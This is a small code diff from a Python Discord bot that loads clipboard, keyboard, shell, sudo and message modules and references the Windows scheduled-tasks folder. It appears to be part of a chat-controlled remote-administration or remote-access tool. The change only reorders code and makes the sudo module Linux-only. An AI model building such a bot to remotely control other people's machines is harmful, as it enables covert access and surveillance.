@@ -17,20 +17,6 @@ DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")
 intents = discord.Intents.default()
 intents.message_content = True
 
-class MyBot(commands.Bot):
-    async def setup_hook(self):
-        # self is the bot here
-        print(f"Logged in as: {self.user}")
-        await self.add_cog(clipboard_cog(bot))
-        await self.add_cog(keyboard_cog(bot))
-        await self.add_cog(shell_cog(bot))
-        await self.add_cog(sudo_cog(bot))
-        await self.add_cog(message_cog(bot))
-
-
-bot = MyBot(command_prefix=["!","! "], intents=intents, help_command=None)
-
-
 if system() == "Windows":
     isWindows = True
     path = "C:\\Windows\\System32\\Tasks\\"
@@ -41,6 +27,21 @@ elif system() == "Linux":
     home_path = os.path.expanduser("~") + "/"
 else:
     exit()
+
+class MyBot(commands.Bot):
+    async def setup_hook(self):
+        # self is the bot here
+        print(f"Logged in as: {self.user}")
+        await self.add_cog(clipboard_cog(bot))
+        await self.add_cog(keyboard_cog(bot))
+        await self.add_cog(shell_cog(bot))
+        await self.add_cog(message_cog(bot))
+        if isWindows == False:
+            await self.add_cog(sudo_cog(bot))
+        
+
+
+bot = MyBot(command_prefix=["!","! "], intents=intents, help_command=None)
 
 
 # Standalone functions
